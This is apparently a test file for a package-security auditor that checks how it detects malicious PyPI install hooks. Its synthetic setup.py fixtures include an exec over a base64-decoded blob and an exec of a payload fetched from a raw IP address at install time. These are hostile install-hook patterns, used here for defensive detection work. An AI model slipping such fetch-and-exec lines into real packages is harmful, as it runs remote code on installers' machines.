"use strict";

const assert = require("node:assert/strict");
const test = require("node:test");
const { auditEvidence } = require("../src/auditor");

// Synthetic-evidence tests (no I/O) for the PyPI-specific heuristics added to
// the auditor: the setup.py install-hook / dropper detector and the recognition
// of setup.py/pyproject.toml as a real manifest (so a scanned sdist is not
// falsely marked incomplete-evidence).

function audit(sourceFiles, npmMetadata) {
  return auditEvidence({
    packageName: "pkg",
    sourceFiles,
    npmMetadata: npmMetadata || {
      name: "pkg", version: "1.0.0",
      repository: { url: "https://github.com/x/pkg", type: "git" },
      maintainers: [{ name: "a" }, { name: "b" }]
    }
  });
}

function hasCategory(report, category) {
  return report.findings.some((f) => f.category === category);
}

test("setup.py dropper (exec over a decoded blob) BLOCKS", () => {
  const setup = [
    "from setuptools import setup",
    "import base64",
    'exec(base64.b64decode("aW1wb3J0IG9z"))',
    'setup(name="pkg", version="1.0.0")'
  ].join("\n");
  const r = audit({ "setup.py": setup });
  assert.equal(r.verdict, "block");
  assert.ok(hasCategory(r, "code-execution"), "obfuscated install-time exec is code-execution");
});

test("setup.py fetching + exec'ing a remote payload BLOCKS", () => {
  const setup = [
    "from setuptools import setup",
    "import urllib.request",
    'exec(urllib.request.urlopen("http://45.9.148.33/x").read())',
    'setup(name="pkg")'
  ].join("\n");
  assert.equal(audit({ "setup.py": setup }).verdict, "block");
});

test("setup.py with a plain subprocess call is REVIEW, not block", () => {
  const setup = [
    "from setuptools import setup",
    "import subprocess",
    'subprocess.call(["git", "rev-parse", "HEAD"])',
    'setup(name="pkg")'
  ].join("\n");
  const r = audit({ "setup.py": setup });
  assert.ok(hasCategory(r, "install-hook"));
  assert.notEqual(r.verdict, "block");
});

test("benign declarative setup.py fires NO install-hook / code-execution", () => {
  const setup = [
    "from setuptools import setup",
    'with open("README.md") as f:',
    "    long_description = f.read()",
    'setup(name="pkg", version="1.0.0", long_description=long_description)'
  ].join("\n");
  const r = audit({ "setup.py": setup });
  assert.equal(hasCategory(r, "install-hook"), false);
  assert.equal(hasCategory(r, "code-execution"), false);
});

test("a JS-style method call (re.compile) does NOT trip the dynamic-exec block", () => {
  const setup = [
    "from setuptools import setup",
    "import re",
    'm = re.compile("x").match("y")',
    'setup(name="pkg")'
  ].join("\n");
  assert.equal(hasCategory(audit({ "setup.py": setup }), "code-execution"), false);
});

test("pyproject.toml in-tree build backend (backend-path) is an install-hook", () => {
  const pyproject = [
    "[build-system]",
    'requires = ["setuptools"]',
    'build-backend = "local_backend"',
    'backend-path = ["./_build"]'
  ].join("\n");
  assert.ok(hasCategory(audit({ "pyproject.toml": pyproject }), "install-hook"));
});

test("a scanned sdist (setup.py present, no package.json) is NOT incomplete-evidence", () => {
  // Regression: PyPI packages have no package.json, so the npm-shaped
  // missing-package-json finding used to fire on every clean sdist and drag
  // the verdict down. A recognized Python manifest means the evidence is
  // complete.
  const setup = 'from setuptools import setup\nsetup(name="pkg", version="1.0.0")';
  const r = audit({ "setup.py": setup, "pkg/__init__.py": "x = 1\n" });
  assert.equal(hasCategory(r, "missing-package-json"), false);
  const incomplete = r.riskBands.find((b) => b.band === "incomplete-evidence");
  assert.equal(incomplete, undefined, "no incomplete-evidence band for a manifested package");
});

test("a package with neither package.json nor a Python manifest still reports missing manifest", () => {
  const r = audit({ "randomfile.py": "print('hi')\n" });
  assert.ok(hasCategory(r, "missing-package-json"));
});
